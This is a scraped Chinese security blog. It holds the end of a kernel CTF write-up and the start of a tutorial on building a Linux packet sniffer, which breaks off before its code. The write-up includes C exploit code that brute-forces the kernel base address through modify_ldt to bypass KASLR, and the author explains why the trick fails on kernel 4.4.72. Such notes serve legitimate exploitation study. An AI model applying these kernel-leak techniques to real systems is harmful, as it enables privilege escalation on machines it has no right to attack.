page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">buf = (<span class="keyword">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">search_addr = page_offset_base;</span><br><span class="line">kernel_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) <span class="comment">/* 爆破kernel_base */</span></span><br><span class="line">&#123;</span><br><span class="line">    write(fd[<span class="number">1</span>], &amp;search_addr, <span class="number">8</span>);</span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval)    </span><br><span class="line">    &#123;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt;= <span class="number">0xffffffff81000000</span>)  &amp;&amp; ((buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x030</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = buf[i] -  <span class="number">0x030</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Found kernel base: %p at %p\n&quot;</span>, kernel_base, search_addr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>; <span class="comment">/* 以0x8000字节为单位分配线程 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但本题目不能使用 <code>modify_ldt + ldt_struct</code> 来泄露内核地址</p>
<ul>
<li>该题目的内核版本是 4.4.72，其 <code>write_ldt</code> 函数的代码有些不同（至少在 4.20.1 才会有 <code>alloc_ldt_struct</code> 函数）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;mm-&gt;context.lock);</span><br><span class="line">	<span class="keyword">if</span> (ldt_info.entry_number &gt;= mm-&gt;context.size) &#123;</span><br><span class="line">		error = alloc_ldt(&amp;current-&gt;mm-&gt;context,</span><br><span class="line">				  ldt_info.entry_number + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	mutex_unlock(&amp;mm-&gt;context.lock);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>发现不会调用 <code>alloc_ldt_struct</code> 函数，取而代之的是 <code>alloc_ldt</code> 函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">alloc_ldt</span><span class="params">(<span class="keyword">mm_context_t</span> *pc, <span class="keyword">int</span> mincount, <span class="keyword">int</span> reload)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *oldldt, *newldt;</span><br><span class="line">	<span class="keyword">int</span> oldsize;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (mincount * LDT_ENTRY_SIZE &gt; PAGE_SIZE)</span><br><span class="line">		newldt = vmalloc(mincount * LDT_ENTRY_SIZE);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		newldt = (<span class="keyword">void</span> *)__get_free_page(GFP_KERNEL);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>而在 <code>alloc_ldt</code> 中使用的是 <code>vmalloc</code>（使用 <code>VMALLOC_START ~ VMALLOC_END</code> 之间的区域）</li>
<li>那么这里就不会复用 UAF 堆块了</li>
</ul>
<hr>
<p><strong>小结：</strong></p>
<p>由于该内核版本没有 <code>swapgs_restore_regs_and_return_to_usermode</code>，本想泄露出 kernel_base 就 OK 的，但是怎么都泄露不出来，后来看源码才发现没有 <code>alloc_ldt_struct</code> 函数</p>
<p>之后找一个符合条件的内核题目，把 <code>pt_regs + seq_operations</code> 和 <code>ldt_struct + modify_ldt</code> 这两种利用都复现一下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/26/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%AE%9E%E7%8E%B0%20Linux%20Sniffer/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/26/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%AE%9E%E7%8E%B0%20Linux%20Sniffer/" class="post-title-link" itemprop="url">网络相关知识：实现 Linux Sniffer</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-26 22:25:38 / Modified: 22:26:52" itemprop="dateCreated datePublished" datetime="2023-02-26T22:25:38+08:00">2023-02-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Sniffer-总述"><a href="#Sniffer-总述" class="headerlink" title="Sniffer 总述"></a>Sniffer 总述</h2><p>Sniffer，中文可以翻译为嗅探器，也叫抓数据包软件，是一种基于被动侦听原理的网络分析方式</p>
<ul>
<li>使用这种技术方式，可以监视网络的状态、数据流动情况以及网络上传输的信息</li>
</ul>
<h2 id="与-Sniffer-相关的知识"><a href="#与-Sniffer-相关的知识" class="headerlink" title="与 Sniffer 相关的知识"></a>与 Sniffer 相关的知识</h2><p>网络信息通过 <code>TCP/IP</code> 来定位网络中计算机的位置：</p>
<ul>
<li>应用程序的 IP 报文被封装成以太网帧（底层链路层报文上面的一层报文，包含有源地址，报文和一些需要用来传送至目标主机的信息）</li>
<li>目的 IP 地址对应着一个6字节的目的以太网址（MAC 地址)，它们之间通过 ARP/RARP 协议进行映射<ul>
<li>ARP（Address Resolution Protocol）地址解析协议：IP地址转换为MAC物理地址</li>
<li>RARP（Reverse Address Resolution Protocol）反向地址转换协议：将MAC物理地址转换为IP地址</li>
</ul>
</li>
<li>包含着以太网帧的报文从源主机传输到目的主机，中间经过一些网络设备，如交换机，路由器等</li>
</ul>
<p>源主机发出的太网帧基于广播方式传播（网络中的所有网卡都能看到它的传输）</p>
<ul>
<li>每个网卡会检查帧开始的6个字节（目的主机的 MAC 地址），但是只有一个网卡会发现自己的地址和其相符合，然后它接收这个帧</li>
<li>读取该太网帧中的 IP 报文</li>
<li>网络驱动程序会检查帧中报文头部的协议标识，以确定接收数据的上层协议 </li>
<li>然后通过对应的网络协议栈传送至接收的应用程序<ul>
<li>大多数情况下，上层就是 IP 协议，所以接收机制将去掉 IP 报文头部，然后把剩下的传送至 UDP 或者 TCP 接收机制，这些协议将把报文送到 <code>socket-handling</code> 机制</li>
<li>然后把报文数据变成应用程序可接收的方式发送出去，在这个过程中，报文将失去所有的和其有关的网络信息（比如：IP，MAC，端口号，IP 选择，TCP 参数 ……），所以如果目的主机没有一个包含正确参数的打开端口，那么这个报文将被丢弃而且永远不会被送到应用层去</li>
</ul>
</li>
</ul>
<p><strong>数据传输经过的各层协议过程</strong></p>
<img src="/2023/02/26/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%AE%9E%E7%8E%B0%20Linux%20Sniffer/1677393531035.png" class width="1677393531035"> 
<ul>
<li>ARP/RARP 用于实现 MAC/IP 之间的切换 </li>
</ul>
<p><strong>太网帧大致结构</strong></p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">[</span><span class="comment">MAC头</span><span class="string">,</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">&#123;数据&#125;</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">,</span><span class="comment">MAC尾</span><span class="title">]</span><span class="comment">		</span>&gt;&gt;&gt;&gt; <span class="comment">以太网驱动</span></span><br><span class="line">--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span><span class="comment">IP头</span><span class="string">,</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">&#123;数据&#125;</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">]</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">	</span>&gt;&gt;&gt;&gt;&gt; <span class="comment">IP</span></span><br><span class="line">--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span><span class="comment">TCP/UDP头</span><span class="string">,</span>--<span class="literal">-</span><span class="literal">-</span><span class="comment">&#123;应用数据&#125;</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">]</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">		</span>&gt;&gt;&gt; <span class="comment">TCP/UDP</span></span><br><span class="line">--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span><span class="comment">应用软件头</span><span class="string">,</span><span class="comment">用户数据</span><span class="title">]</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">		</span>&gt;&gt;&gt;&gt; <span class="comment">应用程序</span></span><br></pre></td></tr></table></figure>
<p>通信过程中，每层协议都要加上一个数据首部（用于存储信息），称为封装 Encapsulation，常见头部如下：</p>
<ul>
<li>以太网帧头部 - 14字节（也叫 MAC 头部）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __UAPI_DEF_ETHHDR</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __UAPI_DEF_ETHHDR		1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __UAPI_DEF_ETHHDR</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	h_dest[ETH_ALEN];	<span class="comment">/* 目标以太网地址 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	h_source[ETH_ALEN];	<span class="comment">/* 源以太网地址 */</span></span><br><span class="line">	__be16		h_proto;		<span class="comment">/* 数据包类型ID字段 */</span></span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>IP 头部 - 20~60字节（取决于有没有 options）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LITTLE_ENDIAN_BITFIELD)</span></span><br><span class="line">	__u8	ihl:<span class="number">4</span>,			<span class="comment">/* 首部长度 */</span></span><br><span class="line">		version:<span class="number">4</span>;			<span class="comment">/* 版本(IPv4/IPv6) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined (__BIG_ENDIAN_BITFIELD)</span></span><br><span class="line">	__u8	version:<span class="number">4</span>,		<span class="comment">/* 版本(IPv4/IPv6) */</span></span><br><span class="line">  		ihl:<span class="number">4</span>;				<span class="comment">/* 首部长度 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span>	<span class="meta-string">&quot;Please fix &lt;asm/byteorder.h&gt;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	__u8	tos;			<span class="comment">/* 服务类型 */</span></span><br><span class="line">	__be16	tot_len;		<span class="comment">/* 总长度(指首部加上数据的总长度) */</span></span><br><span class="line">	__be16	id;				<span class="comment">/* 标识(标识主机发送的每一份数据报) */</span></span><br><span class="line">	__be16	frag_off;		<span class="comment">/* 标志-偏移量 */</span></span><br><span class="line">	__u8	ttl;			<span class="comment">/* 生存时间(数据报在网络中的寿命) */</span></span><br><span class="line">	__u8	protocol;		<span class="comment">/* 协议(数据报携带的数据时使用何种协议) */</span></span><br><span class="line">	__sum16	check;			<span class="comment">/* 首部校验和(只校验数据报的首部) */</span></span><br><span class="line">	__be32	saddr;			<span class="comment">/* 源地址(发送方IP地址) */</span></span><br><span class="line">	__be32	daddr;			<span class="comment">/* 目标地址(接收方IP地址) */</span></span><br><span class="line">	<span class="comment">/*The options start here. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>UDP 头部 - 20字节（8字节真头部，12字节假头部）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">udphdr</span> &#123;</span></span><br><span class="line">	__be16	source;		<span class="comment">/* 源主机端口 */</span></span><br><span class="line">	__be16	dest;		<span class="comment">/* 目标主机端口 */</span></span><br><span class="line">	__be16	len;		<span class="comment">/* UDP长度 */</span></span><br><span class="line">	__sum16	check;		<span class="comment">/* UDP效验和 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>TCP 头部 - 20~60字节（取决于有没有 options）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> &#123;</span></span><br><span class="line">	__be16	source;		<span class="comment">/* 源主机端口 */</span></span><br><span class="line">	__be16	dest;		<span class="comment">/* 目标主机端口 */</span></span><br><span class="line">	__be32	seq;		<span class="comment">/* 队列数目 */</span></span><br><span class="line">	__be32	ack_seq;	<span class="comment">/* 确认编号 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LITTLE_ENDIAN_BITFIELD)</span></span><br><span class="line">	__u16	res1:<span class="number">4</span>,</span><br><span class="line">		doff:<span class="number">4</span>,</span><br><span class="line">		fin:<span class="number">1</span>,</span><br><span class="line">		syn:<span class="number">1</span>,</span><br><span class="line">		rst:<span class="number">1</span>,</span><br><span class="line">		psh:<span class="number">1</span>,</span><br><span class="line">		ack:<span class="number">1</span>,</span><br><span class="line">		urg:<span class="number">1</span>,</span><br><span class="line">		ece:<span class="number">1</span>,</span><br><span class="line">		cwr:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__BIG_ENDIAN_BITFIELD)</span></span><br><span class="line">	__u16	doff:<span class="number">4</span>,</span><br><span class="line">		res1:<span class="number">4</span>,</span><br><span class="line">		cwr:<span class="number">1</span>,</span><br><span class="line">		ece:<span class="number">1</span>,</span><br><span class="line">		urg:<span class="number">1</span>,</span><br><span class="line">		ack:<span class="number">1</span>,</span><br><span class="line">		psh:<span class="number">1</span>,</span><br><span class="line">		rst:<span class="number">1</span>,</span><br><span class="line">		syn:<span class="number">1</span>,</span><br><span class="line">		fin:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span>	<span class="meta-string">&quot;Adjust your &lt;asm/byteorder.h&gt; defines&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	</span></span><br><span class="line">	__be16	window;	</span><br><span class="line">	__sum16	check;		<span class="comment">/* 效验和 */</span></span><br><span class="line">	__be16	urg_ptr;	<span class="comment">/* 紧急指针 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>网络工具 netwox 简述</strong></p>
<p>netwox 是由 lauconstantin 开发的一款网络工具集，适用群体为网络管理员和网络黑客，它可以创造任意的 TCP、UDP 和 IP 数据报文，以实现网络欺骗，并且可以在 Linux 和 Windows 系统中运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  Sniffer sudo netwox 32</span><br><span class="line">Ethernet________________________________________________________.</span><br><span class="line">| 00:0C:29:BF:5F:3F-&gt;00:08:09:0A:0B:0C type:0x0000              |</span><br><span class="line">|_______________________________________________________________|</span><br></pre></td></tr></table></figure>
<ul>
<li><code>00:0C:29:BF:5F:3F</code>：源 MAC 地址，是当前主机的 MAC 地址</li>
<li><code>00:08:09:0A:0B:0C</code>：目标 MAC 地址</li>
<li><code>0x0000</code>：以太网类型 </li>
</ul>
<p>启动 netwox 显示它提供的功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  Sniffer netwox                                           </span><br><span class="line">Netwox toolbox version <span class="number">5.39</span><span class="number">.0</span>. Netwib library version <span class="number">5.39</span><span class="number">.0</span>.</span><br><span class="line"></span><br><span class="line">######################## MAIN MENU #########################</span><br><span class="line"> <span class="number">0</span> - leave netwox</span><br><span class="line"> <span class="number">3</span> - search tools</span><br><span class="line"> <span class="number">4</span> - display help of one tool</span><br><span class="line"> <span class="number">5</span> - run a tool selecting parameters on command line</span><br><span class="line"> <span class="number">6</span> - run a tool selecting parameters from keyboard</span><br><span class="line"> a + information</span><br><span class="line"> b + network protocol</span><br><span class="line"> c + application protocol</span><br><span class="line"> d + sniff (capture network packets)</span><br><span class="line"> e + spoof (create <span class="keyword">and</span> send packets)</span><br><span class="line"> f + record (file containing captured packets)</span><br><span class="line"> g + client</span><br><span class="line"> h + server</span><br><span class="line"> i + ping (check <span class="keyword">if</span> a computer <span class="keyword">if</span> reachable)</span><br><span class="line"> j + traceroute (obtain <span class="built_in">list</span> of gateways)</span><br><span class="line"> k + scan (computer <span class="keyword">and</span> port discovery)</span><br><span class="line"> l + network audit</span><br><span class="line"> m + <span class="function">brute <span class="title">force</span> <span class="params">(check <span class="keyword">if</span> passwords are weak)</span></span></span><br><span class="line"><span class="function"> n + remote administration</span></span><br><span class="line"><span class="function"> o + tools <span class="keyword">not</span> related to network</span></span><br><span class="line"><span class="function">Select a <span class="title">node</span> <span class="params">(key in <span class="number">03456</span>abcdefghijklmno)</span>:</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这不是本篇博客的重点，以后有机会慢慢看</li>
</ul>
<p><strong>网络编程基础</strong></p>
<p>Linux 实现网络通信的核心函数 <code>socket</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>domain：即协议域，又称为协议族（family）<ul>
<li>常用的协议族有：AF_INET、AF_INET6、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE</li>
<li>协议族决定了 socket 的地址类型，在通信中必须采用对应的地址：<ul>
<li>AF_INET：用 ipv4 地址（32位的）与端口号（16位的）的组合</li>
<li>AF_UNIX：用一个绝对路径名作为地址</li>
</ul>
</li>
</ul>
</li>
<li>type：指定 socket 类型<ul>
<li>常用的 socket 类型有：SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET</li>
<li>不同 socket 类型有不同的功能：<ul>
<li>SOCK_STREAM：提供面向连接的稳定数据传输，即TCP协议　</li>
<li>OOB：在所有数据传送前必须使用 connect() 来建立连接状态　</li>
<li>SOCK_SEQPACKET：提供连续可靠的数据包连接　</li>
<li>SOCK_RDM：提供可靠的数据包连接　　</li>
<li>SOCK_PACKET：与网络驱动程序直接通信</li>
<li>SOCK_DGRAM：使用不连续不可靠的数据包连接（去除以太网报文头部）</li>
<li>SOCK_RAW：提供原始网络协议存取（让应用程序对以太网报文头部有完全的控制）</li>
</ul>
</li>
</ul>
</li>
<li>protocol：<ul>
<li>指定协议</li>
<li>常用的协议有，IPPROTO_TCP（TCP传输协议）、IPPTOTO_UDP（UDP传输协议）、IPPROTO_SCTP（STCP传输协议）、IPPROTO_TIPC（TIPC传输协议）</li>
</ul>
</li>
</ul>
<p>服务端需要 <code>bind</code> 函数来“绑定”一个端口</p>
<p>客户端需要 <code>connect</code> 函数来连接指定的服务端（通过 <code>IP:port</code>）</p>
<h2 id="实现-Sniffer"><a href="#实现-Sniffer" class="headerlink" title="实现 Sniffer"></a>实现 Sniffer</h2><p>Sniffer 需要一个 socket 去监听每个端口，得到那些没有被丢弃的报文，使用 PF_PACKET 的协议簇，应用程序可以直接利用网络驱动程序发送和接收报文，避免了原来的协议栈处理过程 </p>
<p><strong>Sniffer 案例一</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 